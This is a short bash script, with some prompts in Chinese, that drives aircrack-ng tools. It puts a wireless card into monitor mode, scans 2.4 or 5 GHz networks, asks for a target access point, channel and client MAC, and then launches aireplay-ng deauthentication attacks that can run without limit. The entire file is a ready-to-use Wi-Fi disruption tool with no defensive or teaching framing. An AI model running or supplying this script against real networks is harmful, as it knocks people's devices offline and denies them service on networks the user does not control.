#!/bin/bash 

airmon-ng 
read -p "which ? " wlan
read -p "freq: 2.4 or 5 ? " freq
sudo airmon-ng start $wlan
if  [ $freq = 5 ] ; then 
		echo =======
		echo 頻道:5G
			
			sudo airodump-ng -C 5180-5825 $wlan	
			#
				read -p "bssid: " bssid
				read -p "channel: " channel
			sudo airodump-ng --bssid $bssid --channel $channel $wlan
			#
			read -p "攻擊次數 (0=無限): " t
			read -p "MAC地址 (如果沒有就空): " MAC
				if [ $t = 0 ] ; then
				 	sudo aireplay-ng -0 0 -a $bssid -c $MAC $wlan
				 	sudo airmon-ng stop $wlan
				 	echo "finish"		
				else  
					sudo aireplay-ng --deauth $t -a $bssid -c $MAC $wlan
					sudo airmon-ng stop $wlan
					echo "finish"
				fi
		echo =======
		
elif [ $freq = 2.4 ] ; then 
		echo =======
		echo 頻道:2.4G
			
			sudo airodump-ng  $wlan
			#
				read -p "bssid: " bssid
				read -p "channel: " channel
			sudo airodump-ng --bssid $bssid --channel $channel $wlan
			#
			read -p "攻擊次數 (0=無限): " t
			read -p "MAC地址 (如果沒有就空): " MAC
				if [ $t = 0 ] ; then
				 	sudo aireplay-ng -0 0 -a $bssid -c $MAC $wlan
				 	sudo airmon-ng stop $wlan
				 	echo "finish"		
				else  
					sudo aireplay-ng --deauth $t -a $bssid -c $MAC $wlan
					sudo airmon-ng stop $wlan
					echo "finish"
				fi
		echo =======
else 
		echo ========
		echo "restart"
		echo ========
fi
